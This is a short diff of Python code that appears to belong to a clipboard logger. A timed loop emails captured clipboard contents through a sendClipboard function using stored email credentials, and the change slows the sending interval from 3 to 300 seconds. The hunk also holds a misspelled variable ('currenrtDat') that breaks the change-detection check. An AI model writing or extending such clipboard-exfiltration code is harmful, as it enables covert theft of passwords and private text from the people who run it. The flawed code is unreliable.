@@ -63,7 +63,7 @@ while time.time() - start < ttl:
     
 #if current time is equal to deicced time in seconds send email(5 minutes)
 #
-    if (round((time.time() - start)) % 3 == 0) and (lastData != currenrtDat): 
+    if (round((time.time() - start)) % 300 == 0) and (lastData != currenrtDat): 
         sendClipboard(email,password,message,port)
         lastData = currentData
         message = ""
